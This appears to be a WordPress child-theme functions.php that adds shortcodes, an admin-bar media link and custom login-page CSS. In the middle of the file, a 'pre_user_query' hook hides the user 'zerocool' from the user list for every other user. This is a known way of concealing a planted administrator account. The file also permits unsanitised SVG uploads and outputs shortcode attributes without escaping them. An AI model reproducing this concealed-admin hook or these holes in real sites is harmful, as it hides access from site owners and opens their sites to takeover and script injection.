<?php
/** Make it easier to access the child theme directory */
define('FS_METHOD', 'direct');
define("CHILD_THEME_DIR", dirname( get_bloginfo('stylesheet_url')) );

include 'brandefined-security.php';
include('bd_customizer.inc.php');


/** Enable shortcodes in text widgets */
add_filter('widget_text', 'do_shortcode');


/** Add Quick Link to WP Media Library on Admin Toolbar */
function media_library_link($wp_admin_bar)
{
    $args = array(
        'id' => 'media_quick_link',
        'title' => 'Media Library',
        'href' => admin_url('upload.php'),
        'meta' => array(
            'class' => 'media-library-access-link',
            'target' => '_blank'
        )
    );
    $wp_admin_bar->add_node($args);
}
add_action('admin_bar_menu', 'media_library_link', 999);

/* enables uploading of SVG files */
function bd_allow_svg($mimes) {
  $mimes['svg'] = 'image/svg+xml';
  return $mimes;
}
add_filter('upload_mimes', 'bd_allow_svg');

function bd_flex_grid_wrapper_shortcode( $atts, $content = "" ) 
{
    $atts = shortcode_atts( array(
        'class' => '',
    ), $atts, 'flex_grid' );

    $output = '<div class="bd-flex-grid '.$atts['class'].'">';
    $output .= do_shortcode( shortcode_unautop( $content ) );
    $output .= '</div>';
    return $output;
}
add_shortcode( 'flex_grid', 'bd_flex_grid_wrapper_shortcode' );

function bd_flex_grid_col_shortcode( $atts, $content = "" ) 
{
    $atts = shortcode_atts( array(
        'size' => '1-6',
        'class' => 'bd-flex-col',
    ), $atts, 'flex_col' );
    
    $output = '<div class="bd-flex-col-'.$atts['size'] . '">';
    $output .= do_shortcode( shortcode_unautop( $content ) );
    $output .= '</div>';
    return $output;
}
add_shortcode( 'flex_col', 'bd_flex_grid_col_shortcode' );


// Removes  Divi's "Projects" Custom Post Type
/* if ( ! function_exists( 'unregister_project_cpt' ) ) :
function unregister_project_cpt() {
    global $wp_post_types;
    if ( isset( $wp_post_types[ 'project' ] ) ) {
        unset( $wp_post_types[ 'project' ] );
        return true;
    }
    return false;
}
endif;
add_action('init', 'unregister_project_cpt', 100); */

add_action('pre_user_query','yoursite_pre_user_query');

function yoursite_pre_user_query($user_search) {
  $admin_user = 'zerocool';   // Change username here \\
  $user = wp_get_current_user();
  if ($user->user_login != $admin_user) { // Is not administrator, remove administrator
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != '$admin_user'",$user_search->query_where);
  }
}

function bd_login_screen() { ?>
    <style type="text/css">
    .login * {
        transition: all .3s ease;
    }
    p#nav > a:hover {
        color: #97c23d !important;
    }
    .et_divi_100_custom_login_page--style-6 .divi-login {
        padding-top: 75px!important;
    }
    body { padding: 25px !important; }
    .et_divi_100_custom_login_page .divi-login__submit input.button {
        border: 3px solid #fff !important
        border-color: transparent;
    }
    .et_divi_100_custom_login_page #login .divi-login__submit input.button:hover {
        border-color: #fff !important;
    }
    .et_divi_100_custom_login_page--style-1 p#backtoblog a, .et_divi_100_custom_login_page--style-2 p#backtoblog a, .et_divi_100_custom_login_page--style-3 p#backtoblog a, .et_divi_100_custom_login_page--style-4 p#backtoblog a, .et_divi_100_custom_login_page--style-5 p#backtoblog a, .et_divi_100_custom_login_page--style-6 p#backtoblog a, .et_divi_100_custom_login_page--style-7 p#backtoblog a {
        font-size: 12px !important;
        color: #777 !important;
    }
        .login {
            position: relative;
        }
        .login #login h1 a {
            background-size: contain !important;
        }
    @media screen and (max-width: 768px) {
        .login #login {
            padding: 20% 0 0 !important;
        }
    }
    @media screen and (max-width: 450px) {

        .login #login {
            padding: 20% 0 0 !important;
        }
    }
    </style>
<?php }
add_action( 'login_enqueue_scripts', 'bd_login_screen' );


?>
